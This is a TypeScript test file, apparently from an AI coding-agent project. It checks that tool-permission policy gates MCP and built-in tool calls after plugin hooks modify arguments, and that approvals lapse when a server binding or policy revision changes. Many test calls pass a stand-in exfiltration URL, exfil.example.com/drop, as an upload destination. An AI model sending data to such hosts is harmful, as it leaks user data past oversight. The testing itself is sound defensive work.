// REQ-236 C2(`alpha-code#1574`)—— 你批准的就是实际执行的那一份(alpha 自有测试;north-star:alpha-owned)。
// 方案 docs/design/req236-permissions-and-provenance.md §2.5、§2.4 第 1/5 条、§3 I3–I5。
//
// 判据全部钉在生产入口与可观察结果上:
//   · 五个 `session/tools.ts` 分支驱动 `SessionTools.resolve()` 返回对象的 `.execute()`;code-mode 子工具驱动
//     注册表里真的 `execute` 工具;直接子任务驱动真 `SessionPrompt.command`(subtask 命令)。
//   · 钩子:前两组是**真插件**(经 `plugin_origins` 装载的文件,`tool.execute.before` 原地改 args、把工具名追加进日志);
//     直接子任务那组用整份 `Plugin.Service` 替身(真 Config 会为插件目录跑依赖安装,替身只做同一件事:原地改 args、计数)。
//   · 实现收到了什么:真远端 MCP server 记下的 `tools/call` 参数 / `resources/read` 的 uri、真落盘的文件内容、
//     资源工具的输出、子会话里的那条用户消息 —— 不是「抛没抛异常」。
//   · 那一问:生产 `Permission.list()` 里真正挂着的请求(审批面读的就是它)。
import fs from "node:fs/promises"
import path from "node:path"
import { pathToFileURL } from "node:url"
import { afterEach, describe, expect } from "bun:test"
import { Server } from "@modelcontextprotocol/sdk/server/index.js"
import { WebStandardStreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/webStandardStreamableHttp.js"
import {
  CallToolRequestSchema,
  ListResourcesRequestSchema,
  ListResourceTemplatesRequestSchema,
  ListToolsRequestSchema,
  ReadResourceRequestSchema,
  type Tool as MCPToolDef,
} from "@modelcontextprotocol/sdk/types.js"
import { CrossSpawnSpawner } from "@opencode-ai/core/cross-spawn-spawner"
import { Database } from "@opencode-ai/core/database/database"
import { LayerNode } from "@opencode-ai/core/effect/layer-node"
import { FSUtil } from "@opencode-ai/core/fs-util"
import { ModelV2 } from "@opencode-ai/core/model"
import { ProjectV2 } from "@opencode-ai/core/project"
import { ProviderV2 } from "@opencode-ai/core/provider"
import { Ripgrep } from "@opencode-ai/core/ripgrep"
import { SessionProjector } from "@opencode-ai/core/session/projector"
import type { ConfigV1 } from "@opencode-ai/core/v1/config/config"
import type { PermissionV1 } from "@opencode-ai/core/v1/permission"
import type { SessionV1 } from "@opencode-ai/core/v1/session"
import { Effect, Fiber, Layer } from "effect"
import { Agent } from "@/agent/agent"
import { BackgroundJob } from "@/background/job"
import { Command } from "@/command"
import { Config } from "@/config/config"
import { InstanceState } from "@/effect/instance-state"
import { RuntimeFlags } from "@/effect/runtime-flags"
import { Env } from "@/env"
import { EventV2Bridge } from "@/event-v2-bridge"
import { Format } from "@/format"
import { Git } from "@/git"
import { Image } from "@/image/image"
import { LSP } from "@/lsp/lsp"
import { MCP } from "@/mcp"
import { Permission } from "@/permission"
import { AlphaToolPolicy, mcpBindingDigest } from "@/permission/alpha-tool-policy"
import { APP_BUILTIN_BINDING_DIGEST } from "@/permission/alpha-tool-policy-gate"
import { Plugin } from "@/plugin"
import { Provider } from "@/provider/provider"
import { Question } from "@/question"
import { Skill } from "@/skill"
import { Snapshot } from "@/snapshot"
import { SessionCompaction } from "@/session/compaction"
import { Instruction } from "@/session/instruction"
import { LLM } from "@/session/llm"
import { MessageV2 } from "@/session/message-v2"
import type { SessionProcessor } from "@/session/processor"
import { SessionProcessor as SessionProcessorSvc } from "@/session/processor"
import { SessionPrompt } from "@/session/prompt"
import { SessionRevert } from "@/session/revert"
import { SessionRunState } from "@/session/run-state"
import { MessageID, SessionID } from "@/session/schema"
import { Session } from "@/session/session"
import { SessionStatus } from "@/session/status"
import { SessionSummary } from "@/session/summary"
import { SystemPrompt } from "@/session/system"
import { Todo } from "@/session/todo"
import { SessionTools } from "@/session/tools"
import { ToolRegistry } from "@/tool/registry"
import type { TaskPromptOps } from "@/tool/task"
import { Truncate } from "@/tool/truncate"
import type { ToolDisplaySnapshotV1 } from "@opencode-ai/schema/tool-identity"
import { TestConfig } from "../fixture/config"
import { disposeAllInstances, provideInstance, TestInstance } from "../fixture/fixture"
import { pollWithTimeout, testEffect } from "../lib/effect"
import { TestLLMServer } from "../lib/llm-server"

// ── 手写的期望字面量 ───────────────────────────────────────────────────────────
const SERVER = "policy"
const ID_UPLOAD = "mcp:policy:upload"
const ALIAS_UPLOAD = "policy_upload"
const ID_WRITE = "builtin::write"
const ID_TASK = "builtin::task"
const HOOKED = "HOOKED-BY-BEFORE-HOOK"
const EXFIL = "https://exfil.example.com/drop"

const ALLOW_ALL: PermissionV1.Rule = { permission: "*", pattern: "*", action: "allow" }
// 「只读」档载体 alpha-readonly 的 D1 两条(ui-mac/src/main/alpha-config-injection.ts 同一字面量;
// 真注入下三档 × 云/第三方/插件的格由 alpha-tier-tool-matrix.test.ts R9–R11 钉住)。
const READONLY: PermissionV1.Rule[] = [ALLOW_ALL, ...Permission.fromConfig({ "mcp:*": "ask", "plugin:*": "ask" })]

// ── 真插件:`tool.execute.before` 原地改 args(与 ext 的 cloud-vision 钩子同一种改法),并记下工具名 ──────
const HOOK_FILE = "alpha-1574-hook.ts"
const HOOK_LOG = "alpha-1574-hook.log"
const hookSource = (log: string) =>
  [
    "import { appendFileSync } from 'node:fs'",
    "const EDIT = {",
    `  ${ALIAS_UPLOAD}: (a) => { a.body = ${JSON.stringify(HOOKED)} },`,
    `  write: (a) => { a.content = ${JSON.stringify(HOOKED)} },`,
    `  list_mcp_resources: (a) => { a.server = ${JSON.stringify(SERVER)} },`,
    `  list_mcp_resource_templates: (a) => { a.server = ${JSON.stringify(SERVER)} },`,
    "  read_mcp_resource: (a) => { a.uri = 'mem://two' },",
    "}",
    "export default {",
    "  id: 'alpha-1574.hook',",
    "  server: async () => ({",
    "    'tool.execute.before': async (input, output) => {",
    `      appendFileSync(${JSON.stringify(log)}, input.tool + '\\n')`,
    "      EDIT[input.tool]?.(output.args)",
    "    },",
    "  }),",
    "}",
    "",
  ].join("\n")

function testServer() {
  const counts = { call: 0, listResources: 0, listTemplates: 0 }
  const seen = { call: [] as unknown[], read: [] as string[] }
  const handle = Effect.acquireRelease(
    Effect.promise(async () => {
      const listed: MCPToolDef[] = [
        {
          name: "upload",
          description: "upload a body to a destination",
          inputSchema: { type: "object", properties: { destination: { type: "string" }, body: { type: "string" } } },
        },
      ]
      const protocol = new Server(
        { name: "alpha-1574", version: "1.0.0" },
        { capabilities: { tools: {}, resources: {} } },
      )
      protocol.setRequestHandler(ListToolsRequestSchema, () => Promise.resolve({ tools: listed }))
      protocol.setRequestHandler(CallToolRequestSchema, (req) => {
        counts.call += 1
        seen.call.push(req.params.arguments)
        return Promise.resolve({ content: [{ type: "text" as const, text: "UPLOADED" }] })
      })
      protocol.setRequestHandler(ListResourcesRequestSchema, () => {
        counts.listResources += 1
        return Promise.resolve({ resources: [{ uri: "mem://one", name: "one", mimeType: "text/plain" }] })
      })
      protocol.setRequestHandler(ListResourceTemplatesRequestSchema, () => {
        counts.listTemplates += 1
        return Promise.resolve({ resourceTemplates: [] })
      })
      protocol.setRequestHandler(ReadResourceRequestSchema, (req) => {
        seen.read.push(req.params.uri)
        return Promise.resolve({ contents: [{ uri: req.params.uri, mimeType: "text/plain", text: "resource-body" }] })
      })
      const transport = new WebStandardStreamableHTTPServerTransport({
        sessionIdGenerator: () => crypto.randomUUID(),
        enableJsonResponse: true,
      })
      await protocol.connect(transport)
      const http = Bun.serve({ port: 0, fetch: (request) => transport.handleRequest(request) })
      return {
        url: http.url.toString(),
        close: async () => {
          await protocol.close().catch(() => {})
          http.stop(true)
        },
      }
    }),
    (server) => Effect.promise(server.close),
  )
  return { handle, counts, seen }
}

const remote = (url: string) => ({ type: "remote" as const, url, oauth: false as const })

function testModel(): Provider.Model {
  return {
    id: ModelV2.ID.make("test-model"),
    providerID: ProviderV2.ID.make("test"),
    name: "Test Model",
    api: { id: "test-model", url: "http://localhost:1/v1", npm: "@ai-sdk/openai-compatible" },
    status: "active",
    headers: {},
    options: {},
    cost: { input: 0, output: 0, cache: { read: 0, write: 0 } },
    limit: { context: 100000, output: 10000 },
    capabilities: {
      temperature: false,
      reasoning: false,
      attachment: false,
      toolcall: true,
      input: { text: true, audio: false, image: false, video: false, pdf: false },
      output: { text: true, audio: false, image: false, video: false, pdf: false },
      interleaved: false,
    },
    release_date: "2025-01-01",
    variants: {},
  }
}

// 同一个会话贯穿一条用例:会话放行(grant)只在同一 sessionID 内成立。
const SESSION_ID = SessionID.create()

function testSession(ruleset: PermissionV1.Ruleset, id = SESSION_ID): Session.Info {
  return {
    id,
    slug: "alpha-1574",
    projectID: ProjectV2.ID.make("alpha-1574"),
    directory: ".",
    title: "alpha-1574",
    version: "0.0.0",
    time: { created: 0, updated: 0 },
    permission: ruleset as PermissionV1.Rule[],
  }
}

type Processor = Pick<
  SessionProcessor.Handle,
  "message" | "updateToolCall" | "completeToolCall" | "registerToolDisplay"
>

function testProcessor(): Processor {
  return {
    message: { id: MessageID.ascending() },
    updateToolCall: () => Effect.void,
    completeToolCall: () => Effect.void,
    registerToolDisplay: (_technicalId: string, _display: ToolDisplaySnapshotV1) => {},
  } as unknown as Processor
}

const resolveTools = Effect.fn("alpha1574.resolveTools")(function* (ruleset: PermissionV1.Ruleset, id?: SessionID) {
  const agents = yield* Agent.Service
  return yield* SessionTools.resolve({
    agent: yield* agents.defaultInfo(),
    model: testModel(),
    session: testSession(ruleset, id),
    processor: testProcessor(),
    bypassAgentCheck: false,
    messages: [],
    promptOps: {} as TaskPromptOps,
  })
})

const toolsRig = (experimentalCodeMode: boolean) =>
  testEffect(
    LayerNode.compile(
      LayerNode.group([
        ToolRegistry.node,
        MCP.node,
        Agent.node,
        Permission.node,
        AlphaToolPolicy.node,
        Plugin.node,
        Truncate.node,
        RuntimeFlags.node,
        Session.node,
        SessionProjector.node,
      ]),
      [
        [
          Config.node,
          TestConfig.layer({
            directories: () => InstanceState.directory.pipe(Effect.map((dir) => [path.join(dir, ".opencode")])),
            get: () =>
              InstanceState.directory.pipe(
                Effect.map((dir) => ({
                  plugin_origins: [
                    {
                      spec: pathToFileURL(path.join(dir, HOOK_FILE)).href,
                      source: path.join(dir, "opencode.json"),
                      scope: "local" as const,
                    },
                  ],
                })),
              ),
          }),
        ],
        [RuntimeFlags.node, RuntimeFlags.layer({ experimentalCodeMode })],
        [AlphaToolPolicy.node, AlphaToolPolicy.layer({ account: Effect.sync(() => policyAccount) })],
      ],
    ),
  )
const it = toolsRig(false)
const itCodeMode = toolsRig(true)

afterEach(async () => {
  await disposeAllInstances()
})

// 分区隔离:每条用例一个独立账户分区(生产层自己的 account 注入口),层其余部分全是生产的。
let policyAccount = "anonymous"

const setup = Effect.fn("alpha1574.setup")(function* () {
  policyAccount = `t-${Math.random().toString(36).slice(2)}`
  const test = yield* TestInstance
  const log = path.join(test.directory, HOOK_LOG)
  // 插件文件必须先于本实例第一次用到 Plugin.Service 落盘(实例的钩子表在第一次用时装载)。
  yield* Effect.promise(() => Bun.write(path.join(test.directory, HOOK_FILE), hookSource(log)))
  const server = testServer()
  const running = yield* server.handle
  yield* (yield* MCP.Service).add(SERVER, remote(running.url))
  return {
    url: running.url,
    counts: server.counts,
    seen: server.seen,
    /** 钩子日志:真插件每触发一次 `tool.execute.before` 追加一行工具名。 */
    hooks: () =>
      Effect.promise(() =>
        fs.readFile(log, "utf8").then(
          (text) => text.split("\n").filter(Boolean),
          () => [] as string[],
        ),
      ),
  }
})

type Outcome = { ok: true; value: unknown } | { ok: false; error: unknown }

function launch(tool: { execute?: (...args: never[]) => unknown }, callID: string, args: unknown) {
  let outcome: Outcome | undefined
  const options = { toolCallId: callID, messages: [], abortSignal: new AbortController().signal }
  const promise = Promise.resolve(tool.execute!(args as never, options as never)).then(
    (value) => {
      outcome = { ok: true, value }
    },
    (error) => {
      outcome = { ok: false, error }
    },
  )
  return { promise, settled: () => outcome }
}

const finish = (run: ReturnType<typeof launch>) =>
  Effect.promise(() => run.promise).pipe(Effect.map(() => run.settled()!))

const message = (outcome: Outcome) => (outcome.ok ? "" : String((outcome.error as Error)?.message ?? outcome.error))

/** 等这次调用要么挂进待批(返回那一条),要么不问就跑完(返回 undefined)。 */
const askedOrRan = Effect.fn("alpha1574.askedOrRan")(function* (run: ReturnType<typeof launch>) {
  const permission = yield* Permission.Service
  for (let i = 0; i < 150; i += 1) {
    const pending = yield* permission.list()
    if (pending.length > 0) return pending
    if (run.settled()) return undefined
    yield* Effect.sleep("20 millis")
  }
  throw new Error("call neither asked nor finished")
})

const onlyPending = Effect.fn("alpha1574.onlyPending")(function* (run: ReturnType<typeof launch>) {
  const pending = yield* askedOrRan(run)
  expect(pending).toHaveLength(1)
  return pending![0]!
})

const reply = (request: PermissionV1.Request, answer: "once" | "always" | "reject") =>
  Effect.gen(function* () {
    yield* (yield* Permission.Service).reply({ requestID: request.id, reply: answer })
  })

describe("#1574 AC1:策略文档判为拒绝 ⇒ 任何钩子之前具名拒绝", () => {
  it.instance("MCP 与内置各一:设置里停用 ⇒ 具名拒绝,钩子 0 次、实现 0 次、零待批", () =>
    Effect.gen(function* () {
      const { counts, hooks } = yield* setup()
      const test = yield* TestInstance
      const policy = yield* AlphaToolPolicy.Service
      yield* policy.setRecord({ selector: { level: "tool", canonical: ID_UPLOAD }, state: "disabled" })
      yield* policy.setRecord({ selector: { level: "tool", canonical: ID_WRITE }, state: "disabled" })
      const tools = yield* resolveTools([ALLOW_ALL])
      const target = path.join(test.directory, "AC1.txt")
      const mcpOut = yield* finish(launch(tools[ALIAS_UPLOAD]!, "ac1-m", { destination: EXFIL, body: "x" }))
      const writeOut = yield* finish(launch(tools["write"]!, "ac1-w", { filePath: target, content: "x" }))
      for (const [out, canonical] of [
        [mcpOut, ID_UPLOAD],
        [writeOut, ID_WRITE],
      ] as const) {
        expect(out.ok).toBe(false)
        expect(message(out)).toContain(canonical)
        expect(message(out)).toContain("alpha-tool-policy")
      }
      expect(yield* hooks()).toEqual([])
      expect(counts.call).toBe(0)
      expect(yield* Effect.promise(() => Bun.file(target).exists())).toBe(false)
      expect(yield* (yield* Permission.Service).list()).toEqual([])
    }),
  )
})

describe("#1574 AC2 / AC7:询问在钩子之后、实现之前,metadata.args 就是实现收到的那一份;恰好一问", () => {
  it.instance("MCP:钩子改了 body ⇒ 那一问带改后的 args 与 policy 元数据;once 后远端收到的逐字相同", () =>
    Effect.gen(function* () {
      const { url, counts, seen, hooks } = yield* setup()
      const test = yield* TestInstance
      const tools = yield* resolveTools([ALLOW_ALL])
      const run = launch(tools[ALIAS_UPLOAD]!, "ac2-m", { destination: EXFIL, body: "original" })
      const request = yield* onlyPending(run)
      expect(yield* hooks()).toEqual([ALIAS_UPLOAD]) // 钩子已经跑过,问在它之后
      expect(counts.call).toBe(0)
      expect(request.permission).toBe(ID_UPLOAD)
      expect(request.metadata["args"]).toEqual({ destination: EXFIL, body: HOOKED })
      const digest = mcpBindingDigest(SERVER, remote(url))
      expect(request.metadata["policy"]).toEqual({
        directory: test.directory,
        canonical: ID_UPLOAD,
        bindingDigest: digest,
        askedBy: "policy",
      })
      const revision = (yield* (yield* AlphaToolPolicy.Service).snapshot()).revision
      expect(request.patterns).toEqual([`${digest}@${revision}`])
      expect(request.always).toEqual(request.patterns)
      yield* reply(request, "once")
      expect((yield* finish(run)).ok).toBe(true)
      expect(seen.call).toEqual([{ destination: EXFIL, body: HOOKED }])
      expect(yield* (yield* Permission.Service).list()).toEqual([])
    }),
  )

  it.instance(
    "内置 write:钩子改了 content ⇒ 那一问带改后的 args;once 后落盘的就是改后的内容",
    () =>
      Effect.gen(function* () {
        const { hooks } = yield* setup()
        const test = yield* TestInstance
        yield* (yield* AlphaToolPolicy.Service).setRecord({
          selector: { level: "tool", canonical: ID_WRITE },
          state: "ask",
        })
        const tools = yield* resolveTools([ALLOW_ALL])
        const target = path.join(test.directory, "AC2-WRITE.txt")
        const run = launch(tools["write"]!, "ac2-w", { filePath: target, content: "original" })
        const request = yield* onlyPending(run)
        expect(yield* hooks()).toEqual(["write"])
        expect(request.permission).toBe(ID_WRITE)
        expect(request.metadata["args"]).toEqual({ filePath: target, content: HOOKED })
        expect(request.metadata["policy"]).toMatchObject({
          bindingDigest: APP_BUILTIN_BINDING_DIGEST,
          askedBy: "policy",
        })
        expect(yield* Effect.promise(() => Bun.file(target).exists())).toBe(false)
        yield* reply(request, "once")
        expect((yield* finish(run)).ok).toBe(true)
        expect(yield* Effect.promise(() => Bun.file(target).text())).toBe(HOOKED)
        expect(yield* (yield* Permission.Service).list()).toEqual([])
      }),
    { git: true },
  )

  it.instance("三条 MCP 资源工具:参数在钩子之后解析 ⇒ 那一问与实现看到的都是钩子改过的 server / uri", () =>
    Effect.gen(function* () {
      const { counts, seen, hooks } = yield* setup()
      const policy = yield* AlphaToolPolicy.Service
      for (const name of ["list_mcp_resources", "list_mcp_resource_templates", "read_mcp_resource"])
        yield* policy.setRecord({ selector: { level: "tool", canonical: `host::${name}` }, state: "ask" })
      const tools = yield* resolveTools([ALLOW_ALL])
      const cases = [
        { name: "list_mcp_resources", args: {}, hooked: { server: SERVER } },
        { name: "list_mcp_resource_templates", args: {}, hooked: { server: SERVER } },
        {
          name: "read_mcp_resource",
          args: { server: SERVER, uri: "mem://one" },
          hooked: { server: SERVER, uri: "mem://two" },
        },
      ]
      for (const item of cases) {
        const run = launch(tools[item.name]!, `ac2-${item.name}`, item.args)
        const request = yield* onlyPending(run)
        expect((yield* hooks()).at(-1)).toBe(item.name)
        expect(request.permission).toBe(`host::${item.name}`)
        expect(request.metadata["args"]).toEqual(item.hooked)
        yield* reply(request, "once")
        const out = yield* finish(run)
        expect(out.ok).toBe(true)
        // 实现用的是钩子改过的参数:输出里回显的 server / uri。
        expect((out.ok ? (out.value as { metadata: Record<string, unknown> }) : undefined)?.metadata).toMatchObject(
          item.hooked,
        )
      }
      expect(counts.listResources).toBe(1)
      expect(counts.listTemplates).toBe(1)
      expect(seen.read).toEqual(["mem://two"])
      expect(yield* hooks()).toEqual(cases.map((item) => item.name))
      expect(yield* (yield* Permission.Service).list()).toEqual([])
    }),
  )

  itCodeMode.instance("code-mode 子工具:钩子改了 body ⇒ 子调用那一问带改后的 args;once 后远端收到的逐字相同", () =>
    Effect.gen(function* () {
      const { seen, counts, hooks } = yield* setup()
      // code-mode 在执行时读会话(取规则集),所以这条用例用一个真建出来的会话。
      const chat = yield* (yield* Session.Service).create({ title: "REQ-236 C2 code-mode" })
      const tools = yield* resolveTools([ALLOW_ALL], chat.id)
      const run = launch(tools["execute"]!, "ac2-cm", {
        code: `return await tools.${SERVER}.upload({ destination: ${JSON.stringify(EXFIL)}, body: "original" })`,
      })
      const request = yield* onlyPending(run)
      // 外层 execute 自己的钩子先跑,子工具的钩子在子调用那一问之前跑。
      expect(yield* hooks()).toEqual(["execute", ALIAS_UPLOAD])
      expect(request.permission).toBe(ID_UPLOAD)
      expect(request.metadata["args"]).toEqual({ destination: EXFIL, body: HOOKED })
      expect(counts.call).toBe(0)
      yield* reply(request, "once")
      expect((yield* finish(run)).ok).toBe(true)
      expect(seen.call).toEqual([{ destination: EXFIL, body: HOOKED }])
      expect(yield* (yield* Permission.Service).list()).toEqual([])
    }),
  )
})

describe("#1574 AC3:审批挂起期间停用或重绑 ⇒ 回复后实现 0 次,具名原因", () => {
  it.instance("挂起中在设置里停用,回复「允许一次」或「始终」⇒ 远端 0 次,拒绝点名工具与策略", () =>
    Effect.gen(function* () {
      const { counts } = yield* setup()
      const policy = yield* AlphaToolPolicy.Service
      const tools = yield* resolveTools([ALLOW_ALL])
      for (const answer of ["once", "always"] as const) {
        yield* policy.removeRecord({ level: "tool", canonical: ID_UPLOAD })
        const run = launch(tools[ALIAS_UPLOAD]!, `ac3-${answer}`, { destination: EXFIL, body: "x" })
        const request = yield* onlyPending(run)
        yield* policy.setRecord({ selector: { level: "tool", canonical: ID_UPLOAD }, state: "disabled" })
        yield* reply(request, answer)
        const out = yield* finish(run)
        expect(out.ok).toBe(false)
        expect(message(out)).toContain(ID_UPLOAD)
        expect(message(out)).toContain("alpha-tool-policy")
      }
      expect(counts.call).toBe(0)
    }),
  )

  it.instance("挂起中服务重绑到新地址,回复「允许一次」⇒ 新旧两台都 0 次,拒绝写明服务配置在审批期间变化", () =>
    Effect.gen(function* () {
      const { counts } = yield* setup()
      const tools = yield* resolveTools([ALLOW_ALL])
      const run = launch(tools[ALIAS_UPLOAD]!, "ac3-rebind", { destination: EXFIL, body: "x" })
      const request = yield* onlyPending(run)
      const second = testServer()
      const running2 = yield* second.handle
      yield* (yield* MCP.Service).add(SERVER, remote(running2.url))
      yield* reply(request, "once")
      const out = yield* finish(run)
      expect(out.ok).toBe(false)
      expect(message(out)).toContain(ID_UPLOAD)
      expect(message(out)).toContain("binding-changed-during-approval")
      expect(message(out)).toContain("服务配置在审批期间变化")
      expect(counts.call).toBe(0)
      expect(second.counts.call).toBe(0)
    }),
  )
})

describe("#1574 AC4:会话放行只对同一 binding、同一策略修订号生效", () => {
  it.instance("「始终」后同一工具不再问;服务定义改变后再调用 ⇒ 重新询问", () =>
    Effect.gen(function* () {
      const { counts } = yield* setup()
      const tools = yield* resolveTools([ALLOW_ALL])
      const first = launch(tools[ALIAS_UPLOAD]!, "ac4-1", { destination: EXFIL, body: "1" })
      yield* reply(yield* onlyPending(first), "always")
      expect((yield* finish(first)).ok).toBe(true)
      // 对照:放行真的在 —— 同一工具第二次不问就跑完。
      const second = launch(tools[ALIAS_UPLOAD]!, "ac4-2", { destination: EXFIL, body: "2" })
      expect(yield* askedOrRan(second)).toBeUndefined()
      expect((yield* finish(second)).ok).toBe(true)
      expect(counts.call).toBe(2)
      // 服务定义改变(同一配置键换地址)。
      const moved = testServer()
      const running2 = yield* moved.handle
      yield* (yield* MCP.Service).add(SERVER, remote(running2.url))
      const third = launch(tools[ALIAS_UPLOAD]!, "ac4-3", { destination: EXFIL, body: "3" })
      const request = yield* onlyPending(third)
      expect(request.metadata["policy"]).toMatchObject({
        bindingDigest: mcpBindingDigest(SERVER, remote(running2.url)),
      })
      yield* reply(request, "reject")
      expect((yield* finish(third)).ok).toBe(false)
      expect(moved.counts.call).toBe(0)
    }),
  )

  it.instance(
    "同项目另一个工作目录写入工具策略 ⇒ 本目录的旧放行失效,同一工具重新询问",
    () =>
      Effect.gen(function* () {
        const { counts } = yield* setup()
        const test = yield* TestInstance
        const tools = yield* resolveTools([ALLOW_ALL])
        const first = launch(tools[ALIAS_UPLOAD]!, "ac4b-1", { destination: EXFIL, body: "1" })
        yield* reply(yield* onlyPending(first), "always")
        expect((yield* finish(first)).ok).toBe(true)
        const second = launch(tools[ALIAS_UPLOAD]!, "ac4b-2", { destination: EXFIL, body: "2" })
        expect(yield* askedOrRan(second)).toBeUndefined()
        yield* finish(second)
        expect(counts.call).toBe(2)
        // 目录 B = 同一 git 仓库里的子目录:同一个项目(策略分区相同)、另一个实例(会话放行各自一份)。
        const dirB = path.join(test.directory, "packages", "b")
        yield* Effect.promise(() => fs.mkdir(dirB, { recursive: true }))
        const projectA = (yield* InstanceState.context).project.id
        const projectB = yield* InstanceState.context.pipe(
          Effect.map((ctx) => ctx.project.id),
          provideInstance(dirB),
        )
        expect(projectB).toBe(projectA)
        yield* Effect.gen(function* () {
          expect(yield* InstanceState.directory).toBe(dirB)
          // 写一条与这个工具无关的记录:任何写入都换修订号。
          yield* (yield* AlphaToolPolicy.Service).setRecord({
            selector: { level: "class", class: "plugin" },
            state: "ask",
          })
        }).pipe(provideInstance(dirB))
        const third = launch(tools[ALIAS_UPLOAD]!, "ac4b-3", { destination: EXFIL, body: "3" })
        const request = yield* onlyPending(third)
        expect(request.permission).toBe(ID_UPLOAD)
        yield* reply(request, "reject")
        yield* finish(third)
        expect(counts.call).toBe(2)
      }),
    { git: true },
  )
})

describe("#1574 AC5 / AC7:规则集要求的询问不产生会话放行,已有放行也消不掉它", () => {
  it.instance("先在全部批准档「始终」放行;只读档同一工具仍问(askedBy=ruleset、always 为空),回复后再调用还问", () =>
    Effect.gen(function* () {
      const { counts } = yield* setup()
      const open = yield* resolveTools([ALLOW_ALL])
      const readonly = yield* resolveTools(READONLY)
      const first = launch(open[ALIAS_UPLOAD]!, "ac5-1", { destination: EXFIL, body: "1" })
      yield* reply(yield* onlyPending(first), "always")
      expect((yield* finish(first)).ok).toBe(true)
      // 只读档:已有放行消不掉这一问。
      const second = launch(readonly[ALIAS_UPLOAD]!, "ac5-2", { destination: EXFIL, body: "2" })
      const request = yield* onlyPending(second)
      expect(request.metadata["policy"]).toMatchObject({ canonical: ID_UPLOAD, askedBy: "ruleset" })
      expect(request.patterns).toEqual(["call:ac5-2"])
      expect(request.always).toEqual([])
      yield* reply(request, "always")
      expect((yield* finish(second)).ok).toBe(true)
      // 回复「始终」也没有产生放行:只读档下一次照样问。
      const third = launch(readonly[ALIAS_UPLOAD]!, "ac5-3", { destination: EXFIL, body: "3" })
      yield* reply(yield* onlyPending(third), "reject")
      expect((yield* finish(third)).ok).toBe(false)
      expect(counts.call).toBe(2)
      // 全部批准档那条旧放行原样在(只读档那一问没有消耗也没有改动它)。
      const fourth = launch(open[ALIAS_UPLOAD]!, "ac5-4", { destination: EXFIL, body: "4" })
      expect(yield* askedOrRan(fourth)).toBeUndefined()
      yield* finish(fourth)
      expect(counts.call).toBe(3)
    }),
  )

  it.instance("只读档回复「始终」不留放行:随后全部批准档的同一工具仍按文档轴问;设置里启用后只读档仍问", () =>
    Effect.gen(function* () {
      const { url, counts } = yield* setup()
      const open = yield* resolveTools([ALLOW_ALL])
      const readonly = yield* resolveTools(READONLY)
      const first = launch(readonly[ALIAS_UPLOAD]!, "ac5b-1", { destination: EXFIL, body: "1" })
      yield* reply(yield* onlyPending(first), "always")
      yield* finish(first)
      const second = launch(open[ALIAS_UPLOAD]!, "ac5b-2", { destination: EXFIL, body: "2" })
      const request = yield* onlyPending(second)
      expect(request.metadata["policy"]).toMatchObject({ askedBy: "policy" })
      yield* reply(request, "reject")
      yield* finish(second)
      // AC7「不论策略文档是什么」:设置里启用(带当前 digest)⇒ 全部批准档不问,只读档仍按规则集问。
      yield* (yield* AlphaToolPolicy.Service).setRecord({
        selector: { level: "tool", canonical: ID_UPLOAD },
        state: "enabled",
        bindingDigest: mcpBindingDigest(SERVER, remote(url)),
      })
      const third = launch(open[ALIAS_UPLOAD]!, "ac5b-3", { destination: EXFIL, body: "3" })
      expect(yield* askedOrRan(third)).toBeUndefined()
      yield* finish(third)
      const fourth = launch(readonly[ALIAS_UPLOAD]!, "ac5b-4", { destination: EXFIL, body: "4" })
      const ruled = yield* onlyPending(fourth)
      expect(ruled.metadata["policy"]).toMatchObject({ askedBy: "ruleset" })
      yield* reply(ruled, "reject")
      yield* finish(fourth)
      expect(counts.call).toBe(2)
    }),
  )
})

// ── 直接子任务(E6):真 SessionPrompt.command 走 subtask 命令 → handleSubtask ─────────────────────────────
// 钩子替身只做真插件做的那件事:`tool.execute.before` 原地改 args、计数;其余钩子原样返回。
let taskHooks = 0
const hookPlugin = Layer.succeed(
  Plugin.Service,
  Plugin.Service.of({
    trigger: ((name: string, input: { tool?: string }, output: { args?: Record<string, unknown> }) =>
      Effect.sync(() => {
        if (name === "tool.execute.before" && input.tool === "task" && output.args) {
          taskHooks += 1
          output.args.prompt = HOOKED
        }
        return output
      })) as unknown as Plugin.Interface["trigger"],
    list: () => Effect.succeed([]),
    tools: () => Effect.succeed([]),
    init: () => Effect.void,
  }),
)
const summary = Layer.succeed(
  SessionSummary.Service,
  SessionSummary.Service.of({
    summarize: () => Effect.void,
    diff: () => Effect.succeed([]),
    computeDiff: () => Effect.succeed([]),
  }),
)
const lsp = Layer.succeed(
  LSP.Service,
  LSP.Service.of({
    init: () => Effect.void,
    status: () => Effect.succeed([]),
    hasClients: () => Effect.succeed(false),
    touchFile: () => Effect.void,
    diagnostics: () => Effect.succeed({}),
    hover: () => Effect.succeed(undefined),
    definition: () => Effect.succeed([]),
    references: () => Effect.succeed([]),
    implementation: () => Effect.succeed([]),
    documentSymbol: () => Effect.succeed([]),
    workspaceSymbol: () => Effect.succeed([]),
    prepareCallHierarchy: () => Effect.succeed([]),
    incomingCalls: () => Effect.succeed([]),
    outgoingCalls: () => Effect.succeed([]),
  }),
)
const noMcp = Layer.succeed(
  MCP.Service,
  MCP.Service.of({
    status: () => Effect.succeed({}),
    clients: () => Effect.succeed({}),
    instructions: () => Effect.succeed([]),
    tools: () => Effect.succeed({}),
    bindingFacts: () => Effect.succeed(undefined),
    prompts: () => Effect.succeed({}),
    resources: () => Effect.succeed({}),
    resourceTemplates: () => Effect.succeed({}),
    add: () => Effect.succeed({ status: { status: "disabled" as const } }),
    connect: () => Effect.void,
    disconnect: () => Effect.void,
    getPrompt: () => Effect.succeed(undefined),
    readResource: () => Effect.succeed(undefined),
    startAuth: () => Effect.die("unexpected MCP auth in alpha-1574 tests"),
    authenticate: () => Effect.die("unexpected MCP auth in alpha-1574 tests"),
    finishAuth: () => Effect.die("unexpected MCP auth in alpha-1574 tests"),
    removeAuth: () => Effect.void,
    supportsOAuth: () => Effect.succeed(false),
    hasStoredTokens: () => Effect.succeed(false),
    getAuthStatus: () => Effect.succeed("not_authenticated" as const),
  }),
)
const itPrompt = testEffect(
  LayerNode.compile(
    LayerNode.group([
      LayerNode.group([
        SessionPrompt.node,
        Session.node,
        SessionProjector.node,
        MessageV2.node,
        Snapshot.node,
        LLM.node,
        Env.node,
        Agent.node,
        Command.node,
        Permission.node,
        AlphaToolPolicy.node,
        Plugin.node,
        Config.node,
        Provider.node,
        LSP.node,
        MCP.node,
        FSUtil.node,
        BackgroundJob.node,
        SessionStatus.node,
        SessionRunState.node,
        Database.node,
        EventV2Bridge.node,
        Question.node,
        Todo.node,
        ToolRegistry.node,
        Skill.node,
        Git.node,
